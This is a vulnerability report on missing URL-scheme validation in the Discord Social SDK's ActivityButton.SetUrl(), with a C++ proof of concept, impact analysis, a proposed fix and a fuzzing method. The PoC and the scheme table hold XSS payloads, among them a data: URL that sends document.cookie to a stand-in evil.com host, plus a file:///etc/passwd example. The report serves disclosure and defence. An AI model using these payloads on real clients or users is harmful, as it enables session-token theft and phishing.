# Security Finding #1: Missing URL Validation in ActivityButton.SetUrl()

**Severity:** High
**Component:** Discord Social SDK v1.8.14587 (Linux x86-64)
**API Affected:** `discordpp::ActivityButton::SetUrl()` / `Discord_ActivityButton_SetUrl()`
**Found via:** Fuzzing + Manual analysis
**Date:** 2026-03-14

---

## Summary

The Discord Social SDK accepts **any string** as an `ActivityButton` URL without performing URL scheme validation or sanitization. This allows a malicious or compromised game to set button URLs using dangerous schemes such as `javascript:`, `data:`, `file://`, and `ftp://` which are stored verbatim and will be transmitted to Discord's servers and potentially displayed to end users.

---

## Description

When a game developer calls `discordpp::ActivityButton::SetUrl()` (or the C-equivalent `Discord_ActivityButton_SetUrl()`), the SDK does **not** validate the URL scheme, length, or content. The value is stored as-is in memory and subsequently sent to Discord's backend as part of the Rich Presence activity data.

### SDK Documentation Claim

The Discord SDK documentation for Activity buttons states:
> "url: The URL opened when clicking the button. Must be a valid URL."

However, **no validation is performed locally** by the SDK.

### Affected Fields

All URL-type string fields in the SDK are unvalidated:

| Field | Class | Documented Limit |
|-------|-------|-----------------|
| `url` (button URL) | `ActivityButton` | "must be a valid URL" |
| `largeUrl` | `ActivityAssets` | "1-256 characters" |
| `smallUrl` | `ActivityAssets` | "1-256 characters" |

---

## Proof of Concept

### Reproduction Steps

```cpp
#define DISCORDPP_IMPLEMENTATION
#include "discordpp.h"
#include <cstdio>
#include <cassert>

int main() {
    discordpp::Activity act;
    act.SetName("Compromised Game");

    // These all succeed without error or exception:
    discordpp::ActivityButton btn1;
    btn1.SetLabel("Claim Reward");
    btn1.SetUrl("javascript:alert(document.cookie)");  // XSS payload
    act.AddButton(std::move(btn1));

    discordpp::ActivityButton btn2;
    btn2.SetLabel("Download");
    btn2.SetUrl("data:text/html,<script>document.location='https://evil.com/?c='+document.cookie</script>");
    act.AddButton(std::move(btn2));

    // Verify the URLs are stored verbatim
    auto buttons = act.GetButtons();
    assert(buttons[0].Url() == "javascript:alert(document.cookie)");
    assert(buttons[1].Url().find("data:text/html") == 0);

    printf("CONFIRMED: javascript: and data: URLs stored verbatim.\n");
    printf("Button 1 URL: %s\n", buttons[0].Url().c_str());
    printf("Button 2 URL: %s\n", buttons[1].Url().c_str());
    return 0;
}
```

### Observed Output

```
CONFIRMED: javascript: and data: URLs stored verbatim.
Button 1 URL: javascript:alert(document.cookie)
Button 2 URL: data:text/html,<script>document.location='https://evil.com/?c='+document.cookie</script>
```

### Accepted Dangerous URL Schemes (all confirmed)

| Scheme | Example | Risk |
|--------|---------|------|
| `javascript:` | `javascript:alert(1)` | XSS if rendered in WebView |
| `data:` | `data:text/html,<script>...</script>` | XSS via data URIs |
| `file://` | `file:///etc/passwd` | Local file access |
| `ftp://` | `ftp://evil.com` | Protocol abuse |
| `discord://` | `discord:///activity/join/TOKEN` | Deep link abuse |
| `//` | `//evil.com/phish` | Protocol-relative phishing |
| `http://` | `http://evil.com` | Plaintext / MITM |
| `""` (empty) | `` | Undefined behavior |
| 10KB string | `AAAA...` (10,000 chars) | No length limit enforced |

---

## Impact

### Primary Impact: XSS via JavaScript URLs
If the Discord client or any Discord-adjacent WebView renders activity buttons and follows `javascript:` URLs without sanitization, **cross-site scripting (XSS)** is possible. An attacker controlling a game's integration could:
- Steal Discord session tokens
- Execute arbitrary JavaScript in the Discord client context
- Redirect users to phishing pages

### Secondary Impact: Social Engineering via Button Labels
The combination of arbitrary labels (`"Claim Free Nitro"`) and arbitrary URLs (`//phishing.com`) enables highly convincing social engineering through activity buttons shown to all users who see the game's rich presence.

### Affected Users
All Discord users who can see the rich presence of a game using a compromised or malicious SDK integration.

---

## Recommended Fix

The SDK should validate `ActivityButton::SetUrl()` before storing the value:

```cpp
// Proposed fix (pseudocode)
void ActivityButton::SetUrl(std::string url) {
    // Enforce https:// scheme only
    if (url.substr(0, 8) != "https://") {
        // Either reject with an error, or sanitize
        throw std::invalid_argument("Button URL must use https:// scheme");
    }
    // Enforce length limit (SDK docs don't specify but Discord API likely limits to 512 chars)
    if (url.size() > 512) {
        url = url.substr(0, 512);
    }
    Discord_ActivityButton_SetUrl(&instance_, {(uint8_t*)url.data(), url.size()});
}
```

---

## Fuzzing Methodology

This finding was discovered by:

1. **Downloading** Discord Social SDK v1.8.14587 for Linux
2. **Building** an AFL++ fuzzing harness (`fuzz_discord_activity.cc`) with:
   - AddressSanitizer + UBSan enabled
   - afl-clang-fast++ instrumentation
   - libAFLDriver for persistent mode
3. **Creating** a seed corpus with realistic activity data
4. **Running** parallel AFL++ instances (`afl-fuzz -M main / -S slave1`)
5. **Manual analysis** of all string-accepting fields, testing dangerous URL schemes

### Environment

```
OS: Linux 6.18.5 x86-64
Fuzzer: AFL++ 4.09c
Compiler: afl-clang-fast++ (Clang 17)
SDK: Discord Social SDK v1.8.14587
Build: Debug + AddressSanitizer + UBSan
```

---

## Files

- `poc/poc_url_validation.cc` — Standalone proof-of-concept
- `../fuzz_discord_activity.cc` — Full AFL++ fuzzing harness
- `../build.sh` — Build script
- `../corpus/` — Seed corpus used during fuzzing
